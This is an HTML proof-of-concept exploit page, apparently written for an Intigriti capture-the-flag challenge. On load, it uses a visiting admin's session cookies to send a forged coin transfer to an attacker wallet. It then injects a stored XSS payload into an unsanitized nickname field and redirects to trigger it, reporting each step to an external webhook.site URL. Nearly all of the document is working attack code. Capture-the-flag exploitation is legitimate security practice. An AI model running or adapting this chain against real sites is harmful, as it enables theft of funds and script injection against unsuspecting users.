<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>EXPLOIT LOADED</h1>
    <div id="status">Initializing...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';

        // XSS Payload - will trigger when transaction loads in marketwatch
        // The nickname field in marketwatch.html is unsanitized (line 326-328)
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

        // Webhook tracking function
        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
            console.log(`[${step}] ${status}`, data);
        }

        function updateStatus(html, className = '') {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = html;
            if (className) statusDiv.className = className;
        }

        async function executeExploit() {
            updateStatus('Starting exploit...<br>Sending coins and injecting XSS...', 'info');

            track('start', 'admin_visited_exploit', {
                target_wallet: YOUR_WALLET,
                xss_payload: XSS_PAYLOAD
            });

            try {
                // Step 1: Send 1337COIN to your wallet
                updateStatus('[1/2] Sending 1337COIN to ' + YOUR_WALLET + '...', 'info');
                track('step1', 'sending_coins_start', { to: YOUR_WALLET, amount: 1337 });

                const tx1Response = await fetch(`${BASE}/api/transaction`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337
                    })
                });

                if (tx1Response.ok) {
                    const tx1Data = await tx1Response.json();
                    updateStatus('[1/2] ✓ Sent 1337COIN to ' + YOUR_WALLET + '!<br>[2/2] Injecting XSS payload...', 'success');
                    track('step1', 'coin_transfer_success', { txHash: tx1Data.txHash || 'completed' });
                } else {
                    updateStatus('[1/2] ✗ Failed to send coins<br>Status: ' + tx1Response.status, 'error');
                    track('step1', 'coin_transfer_failed', { status: tx1Response.status });
                }

                // Step 2: Create transaction with XSS payload in nickname
                // The nickname field is unsanitized in marketwatch.html (line 326-328)
                // This will trigger alert('gigawatz') when admin views marketwatch
                updateStatus('[2/2] Creating transaction with XSS payload in nickname...', 'info');
                track('step2', 'injecting_xss_start', { payload: XSS_PAYLOAD });

                const tx2Response = await fetch(`${BASE}/api/transaction`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: 'xss-payload',
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: XSS_PAYLOAD  // This goes into unsanitized nickname field!
                    })
                });

                if (tx2Response.ok) {
                    const tx2Data = await tx2Response.json();
                    updateStatus('[2/2] ✓ XSS transaction created!<br><br>EXPLOIT COMPLETE!<br><br>When admin visits marketwatch,<br>the XSS will trigger: <strong>alert("gigawatz")</strong>', 'success');
                    track('step2', 'xss_injected_success', {
                        txHash: tx2Data.txHash || 'completed',
                        payload: XSS_PAYLOAD,
                        trigger_location: 'marketwatch_nickname_field'
                    });
                } else {
                    updateStatus('[2/2] ✗ Failed to create XSS transaction<br>Status: ' + tx2Response.status, 'error');
                    track('step2', 'xss_inject_failed', { status: tx2Response.status });
                }

                // Final webhook notification
                track('complete', 'exploit_finished', {
                    coin_transfer: tx1Response.ok,
                    xss_injected: tx2Response.ok,
                    message: 'Admin should now trigger XSS by visiting marketwatch'
                });

                // Redirect to marketwatch after a delay to trigger the XSS
                setTimeout(() => {
                    updateStatus('Redirecting to marketwatch to trigger XSS...', 'info');
                    track('redirect', 'going_to_marketwatch', {});
                    setTimeout(() => {
                        window.location.href = `${BASE}/marketwatch.html`;
                    }, 1000);
                }, 2000);

            } catch (error) {
                updateStatus('ERROR: ' + error.message, 'error');
                track('error', 'exception', { error: error.message, stack: error.stack });
            }
        }

        // Auto-execute on page load
        window.addEventListener('load', () => {
            setTimeout(executeExploit, 500);
        });
    </script>
</body>
</html>

